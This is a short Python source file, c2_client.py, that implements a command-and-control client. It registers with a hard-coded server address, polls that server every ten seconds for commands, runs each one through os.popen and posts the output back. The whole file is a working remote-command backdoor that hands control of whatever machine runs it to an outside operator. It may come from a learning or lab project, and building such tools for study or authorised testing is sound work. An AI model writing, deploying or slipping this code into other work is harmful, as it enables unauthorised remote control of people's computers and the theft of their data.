# c2_client.py - Ethan Zeevi
import requests
import time
import os
import uuid

# CHANGE TO C2SERVER IP ADDRESS & PORT
SERVER_URL = "http://100.64.4.148:5000"
CLIENT_ID = str(uuid.uuid4())  # Generate a unique client ID for each client

# Allows C2 clients to be tracked dynamically
def register_client():
    try:
        response = requests.post(f"{SERVER_URL}/register_client", json={'client_id': CLIENT_ID})
        if response.status_code == 200:
            print(f"Client {CLIENT_ID} registered successfully.")
        else:
            print(f"Failed to register client. Status Code: {response.status_code}")
    except Exception as e:
        print(f"Error registering client: {e}")

# Retrives command from endpoint to be ran on the client
def get_command():
    try:
        response = requests.get(f"{SERVER_URL}/command/{CLIENT_ID}")
        command = response.json().get('command', '')
        return command
    except Exception as e:
        print(f"Error fetching command: {e}")
        return ""

# Sends command output to endpoint to be read from the server/user script
def send_result(result):
    try:
        response = requests.post(f"{SERVER_URL}/result/{CLIENT_ID}", json={'result': result})
        return response.json().get('status', '')
    except Exception as e:
        print(f"Error sending result: {e}")

# Uses popen to run the command retrieved from the endpoint
def execute_command(command):
    if command == "":
        return "No command received."

    try:
        output = os.popen(command).read()
        return output if output else "Command executed with no output."
    except Exception as e:
        return f"Error executing command: {e}"

if __name__ == "__main__":
    print(f"Client ID: {CLIENT_ID}")
    register_client()  # Register the client on startup

    while True:
        command = get_command()
        if command:
            print(f"Received command: {command}")
            result = execute_command(command)
            print(f"Command result: {result}")
            send_result(result)
        time.sleep(10)  # Check every 10 seconds

